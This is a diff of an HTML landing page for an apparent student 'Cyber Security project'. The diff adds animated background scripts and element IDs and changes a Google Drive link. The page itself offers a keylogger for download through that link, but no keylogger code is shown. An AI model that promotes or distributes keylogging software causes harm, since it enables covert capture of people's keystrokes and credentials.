@@ -1,16 +1,18 @@
 <!doctype html>
 <html lang="en" class="h-100">
-
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="">
-    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
-    <meta name="generator" content="Hugo 0.84.0">
-    <title>Cyber Security project</title>
-    <link rel="canonical" href="https://getbootstrap.com/docs/5.0/examples/cover/">
-    <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
-
+    
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="">
+        <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
+        <meta name="generator" content="Hugo 0.84.0">
+        <title>Cyber Security project</title>
+        <link rel="canonical" href="https://getbootstrap.com/docs/5.0/examples/cover/">
+        <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r121/three.min.js"></script>
+         <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.net.min.js"></script>
+        
 
     <!-- Bootstrap core CSS -->
     <link href="assets/dist/css/bootstrap.min.css" rel="stylesheet">
@@ -36,25 +38,25 @@
     <link href="cover.css" rel="stylesheet">
 </head>
 
-<body class="d-flex h-100 text-center text-white bg-dark">
+<body id="bg" class="d-flex h-100 text-center text-white bg-dark">
 
     <div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
         <header class="mb-auto">
             <div>
-                <h3 class="float-md-start mb-0">Cyber Security project</h3>
+                <h3 id="headID" class="float-md-start mb-0">CYBER SECURITY PROJECT</h3>
                 <nav class="nav nav-masthead justify-content-center float-md-end">
-                    <a class="nav-link active" aria-current="page" href="#">Home</a>
-                    <a class="nav-link" href="features.html">Features</a>
-                    <a class="nav-link" href="contact.html">Contact</a>
+                    <a id="home" class="nav-link active" aria-current="page" href="#">Home</a>
+                    <a id="features" class="nav-link" href="features.html">Features</a>
+                    <a id="contact" class="nav-link" href="contact.html">Contact</a>
                 </nav>
             </div>
         </header>
 
         <main class="px-3">
-            <h1>Keyloggers</h1>
+            <h1>Download the Keylogger Software</h1>
             <p class="lead"></p>
             <p class="lead">
-                <a href="https://drive.google.com/drive/folders/1EanWxQfzqYwVoWyPlHtC7Ti4Qifr2P-h?usp=sharing" class="btn btn-lg btn-secondary fw-bold border-white bg-white">Download the keylogger</a>
+                <a href="https://drive.google.com/drive/folders/10ovn4ImD1kU91izpLyfAkiW6a3M-6Qu5?usp=sharing" class="btn btn-lg btn-secondary fw-bold border-white bg-white">Click to download</a>
             </p>
         </main>
 
@@ -65,8 +67,22 @@
         </footer>
     </div>
 
-
-
 </body>
+
+
+  <script>
+  VANTA.NET({
+    el: "#bg",
+    mouseControls: true,
+    touchControls: true,
+    gyroControls: false,
+    minHeight: 200.00,
+    minWidth: 200.00,
+    scale: 1.00,
+    scaleMobile: 1.00,
+    color: 0x9b3c56,
+    spacing: 13.00
+  })
+  </script>
 
 </html>
